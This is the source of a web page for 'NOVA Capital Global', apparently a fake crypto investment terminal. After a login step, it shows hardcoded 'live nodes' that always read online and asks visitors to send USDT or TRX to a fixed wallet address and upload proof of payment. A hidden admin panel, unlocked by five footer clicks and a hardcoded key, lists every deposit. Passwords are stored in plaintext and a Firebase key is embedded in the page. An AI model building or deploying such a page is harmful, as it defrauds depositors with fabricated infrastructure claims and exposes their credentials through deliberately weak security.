<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOVA | Global Institutional Terminal</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0A192F; --accent: #64FFDA; --card-bg: #112240; --text-main: #CCD6F6; --text-dim: #8892B0; }
        body { margin: 0; font-family: 'Inter', sans-serif; background: var(--primary); color: var(--text-main); overflow-x: hidden; }
        .ticker { background: #020c1b; color: var(--accent); padding: 8px; font-size: 11px; border-bottom: 1px solid #112240; }
        
        /* Auth Page */
        #auth-page { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background: radial-gradient(circle, #0a192f 0%, #020c1b 100%); }
        .auth-card { background: var(--card-bg); padding: 40px; border-radius: 12px; width: 100%; max-width: 380px; border-top: 4px solid var(--accent); box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        /* Dashboard */
        #dashboard { display: none; padding: 30px; max-width: 1100px; margin: auto; animation: fadeIn 0.8s; }
        .node-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 10px; margin: 20px 0; }
        .node-item { background: #112240; padding: 10px; border-radius: 6px; font-size: 11px; display: flex; justify-content: space-between; border: 1px solid #233554; }
        .status-on { color: var(--accent); font-weight: bold; }

        input, select { width: 100%; padding: 12px; background: #0A192F; border: 1px solid #233554; color: white; border-radius: 4px; margin-bottom: 15px; box-sizing: border-box; }
        .btn-prime { width: 100%; padding: 14px; background: var(--accent); color: var(--primary); border: none; border-radius: 4px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn-prime:hover { opacity: 0.8; transform: translateY(-2px); }
        .toggle-link { color: var(--accent); font-size: 12px; cursor: pointer; text-decoration: underline; margin-top: 15px; display: block; text-align: center; }

        footer { text-align: center; padding: 40px; color: var(--text-dim); font-size: 11px; cursor: default; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div class="ticker">
        <marquee>GLOBAL STATUS: ACTIVE | 15 SECURE NODES ONLINE | REGISTERED USERS ONLY | ENCRYPTION: AES-256</marquee>
    </div>

    <div id="auth-page">
        <div class="auth-card">
            <h2 id="auth-title" style="text-align: center; letter-spacing: 2px; color: var(--accent);">TERMINAL LOGIN</h2>
            <input type="text" id="username" placeholder="Username / Identification">
            <input type="password" id="password" placeholder="Access Key">
            <button class="btn-prime" id="auth-btn" onclick="handleAuth()">Authorize Access</button>
            <span class="toggle-link" id="toggle-text" onclick="toggleMode()">New User? Create Institutional Account</span>
        </div>
        <footer>&copy; 2026 NOVA CAPITAL GLOBAL. ALL RIGHTS RESERVED.</footer>
    </div>

    <div id="dashboard">
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <h1 style="color: var(--accent); margin: 0;">NOVA TERMINAL</h1>
            <button onclick="logout()" style="background: none; border: 1px solid gray; color: gray; padding: 5px 10px; cursor: pointer; border-radius: 4px;">Logout</button>
        </div>
        <p id="welcome-msg" style="color: var(--text-dim); border-bottom: 1px solid #233554; padding-bottom: 10px;"></p>
        
        <h3>Live Global Node Infrastructure (15 Active)</h3>
        <div class="node-grid" id="nodeContainer"></div>

        <div style="background: #112240; padding: 30px; border-radius: 12px; border: 1px solid var(--accent); margin-top: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
            <h3 style="margin-top: 0;">Institutional Funding Gateway</h3>
            <p style="font-size: 13px; color: var(--text-dim);">Transfer USDT/TRX to the secure address below. Node activation requires proof of transaction.</p>
            
            <div onclick="copyWallet()" style="background: #020c1b; padding: 15px; border-radius: 5px; font-family: monospace; color: var(--accent); cursor: pointer; border: 1px dashed var(--accent); text-align: center; font-size: 14px; margin-bottom: 20px;">
                0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2
            </div>

            <label style="font-size: 11px; color: var(--accent);">SELECT NETWORK</label>
            <select id="pay-method">
                <option value="USDT-BEP20">USDT (Binance Smart Chain)</option>
                <option value="USDT-ERC20">USDT (Ethereum Mainnet)</option>
                <option value="TRX-TRC20">TRON (TRC20 Network)</option>
            </select>

            <label style="font-size: 11px; color: var(--accent);">TRANSACTION ID (TID)</label>
            <input type="text" id="txid" placeholder="Paste TXID / Hash here">

            <label style="font-size: 11px; color: var(--accent);">UPLOAD PROOF (SCREENSHOT)</label>
            <input type="file" id="proofImage" accept="image/*" style="padding: 8px;">

            <button class="btn-prime" id="submitBtn" onclick="submitDeposit()">Submit Proof & Activate Node</button>
        </div>
        
        <footer id="secret-trigger">
            System Monitoring Active. Access Logs Encrypted.
        </footer>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo",
            authDomain: "home-94d45.firebaseapp.com",
            projectId: "home-94d45",
            appId: "1:964390949419:web:589840cb91b7e42ecd506e"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLoginMode = true;

        window.toggleMode = function() {
            isLoginMode = !isLoginMode;
            document.getElementById('auth-title').innerText = isLoginMode ? "TERMINAL LOGIN" : "CREATE ACCOUNT";
            document.getElementById('auth-btn').innerText = isLoginMode ? "Authorize Access" : "Register Node";
            document.getElementById('toggle-text').innerText = isLoginMode ? "New User? Create Institutional Account" : "Already registered? Switch to Login";
        };

        window.handleAuth = async function() {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("All fields are required, sweetie.");

            if(isLoginMode) {
                const userSnap = await getDoc(doc(db, "users", u));
                if(userSnap.exists() && userSnap.data().password === p) {
                    sessionStorage.setItem("nova_user", u);
                    showDashboard();
                } else { alert("Access Denied: Invalid identification."); }
            } else {
                await setDoc(doc(db, "users", u), { password: p, date: new Date().toISOString() });
                alert("Account secured successfully! You can now login.");
                toggleMode();
            }
        };

        window.submitDeposit = async function() {
            const tx = document.getElementById('txid').value;
            const method = document.getElementById('pay-method').value;
            const fileInput = document.getElementById('proofImage');
            const btn = document.getElementById('submitBtn');

            if(!tx || fileInput.files.length === 0) return alert("Please provide TID and Screenshot proof, sweetie.");

            btn.innerText = "Processing...";
            btn.disabled = true;

            const reader = new FileReader();
            reader.onloadend = async function() {
                try {
                    await setDoc(doc(db, "deposits", "tx_" + Date.now()), {
                        user: sessionStorage.getItem("nova_user"),
                        tid: tx,
                        method: method,
                        proof: reader.result,
                        status: "Pending",
                        date: new Date().toLocaleString()
                    });
                    alert("Submission received! Verification node is processing your request.");
                    location.reload();
                } catch(e) { alert("Error: " + e.message); btn.disabled = false; }
            };
            reader.readAsDataURL(fileInput.files[0]);
        };

        // SECRET ADMIN (5 Clicks on Footer)
        let adminClicks = 0;
        document.getElementById('secret-trigger').onclick = async function() {
            adminClicks++;
            if(adminClicks === 5) {
                const key = prompt("Enter Master Administrative Key:");
                if(key === "nova_boss_786") {
                    const snap = await getDocs(collection(db, "deposits"));
                    let html = `<div style="background:#020c1b; color:white; padding:20px; min-height:100vh; font-family:sans-serif;">
                                <h2 style="color:#64FFDA;">ADMIN AUDIT LOG</h2>
                                <button onclick="location.reload()">Back</button><br><br>
                                <table border="1" style="width:100%; border-collapse:collapse; text-align:left;">
                                <tr style="background:#112240;"><th>User</th><th>Method</th><th>TID</th><th>Proof</th></tr>`;
                    snap.forEach(d => {
                        const data = d.data();
                        html += `<tr><td>${data.user}</td><td>${data.method}</td><td>${data.tid}</td>
                                 <td><img src="${data.proof}" width="100" onclick="window.open(this.src)" style="cursor:pointer"></td></tr>`;
                    });
                    document.body.innerHTML = html + `</table></div>`;
                }
                adminClicks = 0;
            }
        };

        function showDashboard() {
            document.getElementById('auth-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            document.getElementById('welcome-msg').innerText = "System Identity: " + sessionStorage.getItem("nova_user");
            loadNodes();
        }

        function loadNodes() {
            const container = document.getElementById('nodeContainer');
            const nodes = ["NV-Alpha (London)", "NV-Beta (Tokyo)", "NV-Gamma (NY)", "NV-Delta (SG)", "NV-Epsilon (FR)", "NV-Zeta (SYD)", "NV-Eta (DXB)", "NV-Theta (PAR)", "NV-Iota (HK)", "NV-Kappa (ZRH)", "V-Layer-1", "V-Layer-2", "V-Layer-3", "V-Layer-4", "V-Layer-5"];
            container.innerHTML = "";
            nodes.forEach(n => { container.innerHTML += `<div class="node-item"><span>${n}</span><span class="status-on">ONLINE</span></div>`; });
        }

        window.copyWallet = () => { navigator.clipboard.writeText("0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2"); alert("Address Copied!"); };
        window.logout = () => { sessionStorage.clear(); location.reload(); };

        if(sessionStorage.getItem("nova_user")) showDashboard();
    </script>
</body>
</html>
